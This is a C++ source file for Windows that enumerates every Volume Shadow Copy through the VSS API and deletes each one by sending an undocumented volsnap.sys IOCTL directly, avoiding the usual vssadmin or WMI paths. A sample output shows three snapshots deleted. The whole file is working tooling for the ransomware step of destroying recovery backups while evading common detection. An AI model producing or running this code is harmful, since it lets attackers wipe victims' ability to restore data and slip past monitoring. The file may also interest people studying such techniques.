#include <Windows.h>
#include <stdio.h>
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>
#include <vsmgmt.h>
#include <atlcomcli.h>


#pragma comment (lib, "VssApi.lib")
#pragma comment (lib, "ResUtils.lib")


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// https://github.com/eronnen/procmon-parser/blob/master/procmon_parser/consts.py#L1028
#define IOCTL_VOLSNAP_DELETE_SNAPSHOT  0x53C038 

// VspDeleteSnapshot (Volsnap.sys)
typedef struct _VOLSNAP_DELETE_SNAPSHOT
{
	USHORT	uShadowCopyVolumeNameLen;
	WCHAR  	szShadowCopyVolume[MAX_PATH];

} VOLSNAP_DELETE_SNAPSHOT, * PVOLSNAP_DELETE_SNAPSHOT;


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

/*
@ pwszBackedVol - The volume/drive that the shadow copy is based on (e.g., "\\.\Volume{GUID}\", or "\\.\X:").

@ wszSnapDevice - The shadow copy device to delete (e.g., "\Device\HarddiskVolumeShadowCopyX").
*/


BOOL DeleteShadowCopiesViaIoctl(IN LPCWSTR pwszBackedVol, IN LPCWSTR pwszSnapDevice) {

	VOLSNAP_DELETE_SNAPSHOT 	VolSnapDeleteSnapshot		= { 0 };
	HANDLE				hVolume				= INVALID_HANDLE_VALUE;
	DWORD				dwBytesReturned			= 0x00;
	BOOL 				bResult				= TRUE;

	VolSnapDeleteSnapshot.uShadowCopyVolumeNameLen = (USHORT)(lstrlenW(pwszSnapDevice) * sizeof(WCHAR));
	RtlCopyMemory(VolSnapDeleteSnapshot.szShadowCopyVolume, pwszSnapDevice, VolSnapDeleteSnapshot.uShadowCopyVolumeNameLen + sizeof(WCHAR));
	
	if ((hVolume = CreateFileW(pwszBackedVol, FILE_GENERIC_READ | FILE_GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error: %ld \n", GetLastError());
		return FALSE;
	}

	if (!DeviceIoControl(hVolume, IOCTL_VOLSNAP_DELETE_SNAPSHOT, &VolSnapDeleteSnapshot, sizeof(VOLSNAP_DELETE_SNAPSHOT), NULL, 0x00, &dwBytesReturned, NULL)) {
		printf("[!] DeviceIoControl Failed With Error: %ld \n", GetLastError());
		bResult = FALSE;
	}

	CloseHandle(hVolume);
	return bResult;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


BOOL EnumerateShadowCopiesViaVssAndDeleteViaIoctl(OUT OPTIONAL PDWORD pdwNumberOfCopiesDeleted) {

	CComPtr<IVssBackupComponents>   m_VssBackupObj		= NULL;
	CComPtr<IVssEnumObject>		m_VssEnumObj		= NULL;
	HRESULT				hResults		= S_OK;

	if ((hResults = CoInitialize(NULL)) != S_OK) {
		printf("[!] CoInitialize Failed With Error: 0x%0.8X \n", hResults);
		goto _END_OF_FUNC;
	}

	if ((hResults = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL)) != S_OK) {
		printf("[!] CoInitializeSecurity Failed With Error: 0x%0.8X \n", hResults);
		goto _END_OF_FUNC;
	}

	if ((hResults = CreateVssBackupComponents(&m_VssBackupObj)) != S_OK) {

		if (hResults == E_ACCESSDENIED)
			printf("[!] Access Denied, Requires Administration Rights \n");
		else
			printf("[!] CreateVssBackupComponents Failed With Error: 0x%0.8X \n", hResults);

		goto _END_OF_FUNC;
	}

	if ((hResults = m_VssBackupObj->InitializeForBackup()) != S_OK) {
		printf("[!] InitializeForBackup Failed With Error: 0x%0.8X \n", hResults);
		goto _END_OF_FUNC;
	}

	if ((hResults = m_VssBackupObj->SetContext(VSS_CTX_ALL)) != S_OK) {
		printf("[!] SetContext Failed With Error: 0x%0.8X \n", hResults);
		goto _END_OF_FUNC;
	}

	if ((hResults = m_VssBackupObj->Query(GUID_NULL, VSS_OBJECT_NONE, VSS_OBJECT_SNAPSHOT, &m_VssEnumObj)) != S_OK) {

		if (hResults == VSS_E_OBJECT_NOT_FOUND || hResults == S_FALSE)
		{
			printf("[i] There Is No Shadow Copies On This Machine \n");
			hResults = VSS_E_OBJECT_NOT_FOUND;
		}
		else
		{
			printf("[!] Query Failed With Error: 0x%0.8X \n", hResults);
		}

		goto _END_OF_FUNC;
	}

	while (TRUE)
	{
		VSS_OBJECT_PROP			VssObjectProp				= {  };
		VSS_SNAPSHOT_PROP&  		VssSnapshotProp				= VssObjectProp.Obj.Snap;
		ULONG				uFetchedCopiesNmbr			= 0x00;
		LPCWSTR				pwszFullSnapDev				= NULL;
		LPCWSTR				pwszStartDev				= NULL;
		WCHAR				wszSnapDevice[MAX_PATH]			= { 0 };
		WCHAR				wszBackedVol[MAX_PATH]			= { 0 };
		INT				wszBackedVolLen				= 0x00;
		LPCWSTR				pwszOrigVol				= NULL;

		if ((hResults = m_VssEnumObj->Next(0x01, &VssObjectProp, &uFetchedCopiesNmbr)) != S_OK) {

			if (hResults == S_FALSE && uFetchedCopiesNmbr == 0x00)
			{
				printf("[i] No More Shadow Copies Were Detected \n");
				hResults = S_OK;
				break;
			}

			printf("[!] Next Failed With Error: 0x%0.8X \n", hResults);
			goto _END_OF_FUNC;
		}

		pwszFullSnapDev	= VssSnapshotProp.m_pwszSnapshotDeviceObject;
		pwszStartDev	= wcsstr(pwszFullSnapDev, L"\\Device\\");

		if (!pwszStartDev)
		{
			VssFreeSnapshotProperties(&VssSnapshotProp);
			continue; 
		}

		wcsncpy_s(wszSnapDevice, pwszStartDev, _TRUNCATE);

		pwszOrigVol = VssSnapshotProp.m_pwszOriginalVolumeName;
		
		if (_wcsnicmp(pwszOrigVol, L"\\\\?\\", 4) == 0)
			swprintf_s(wszBackedVol, L"\\\\.\\%s", pwszOrigVol + 4);
		else
			wcsncpy_s(wszBackedVol, pwszOrigVol, _TRUNCATE);

		wszBackedVolLen = lstrlenW(wszBackedVol);

		if (wszBackedVolLen && wszBackedVol[wszBackedVolLen - 1] == L'\\')
			wszBackedVol[wszBackedVolLen - 1] = L'\0';

		wprintf(L"[i] Deleting Shadow Copy: %s Of %s \n", wszSnapDevice, wszBackedVol);

		if (DeleteShadowCopiesViaIoctl(wszBackedVol, wszSnapDevice))
		{
			if (pdwNumberOfCopiesDeleted) (*pdwNumberOfCopiesDeleted)++;
		}

		VssFreeSnapshotProperties(&VssSnapshotProp);
	}

_END_OF_FUNC:
	return (hResults == S_OK || hResults == VSS_E_OBJECT_NOT_FOUND) ? TRUE : FALSE;
}



// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


int main() 
{
	
	DWORD dwNumberOfCopiesDeleted = 0x00;

	EnumerateShadowCopiesViaVssAndDeleteViaIoctl(&dwNumberOfCopiesDeleted);

	if (dwNumberOfCopiesDeleted)
		printf("[+] Successfully Deleted [ %lu ] Shadow Copies \n", dwNumberOfCopiesDeleted);

	return 0;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


/*
[#] Useful Commands:

@ vssadmin list shadows - List all shadow copies on the system.

@ wmic shadowcopy call create Volume=X:\ - Create a shadow copy of the specified volume.
*/


/*
[#] Output Example:

[i] Deleting Shadow Copy: \Device\HarddiskVolumeShadowCopy16 Of \\.\Volume{15fc7409-6239-4308-b941-e848a0486268}
[i] Deleting Shadow Copy: \Device\HarddiskVolumeShadowCopy17 Of \\.\Volume{15fc7409-6239-4308-b941-e848a0486268}
[i] Deleting Shadow Copy: \Device\HarddiskVolumeShadowCopy18 Of \\.\Volume{15fc7409-6239-4308-b941-e848a0486268}
[i] No More Shadow Copies Were Detected
[+] Successfully Deleted [ 3 ] Shadow Copies
*/

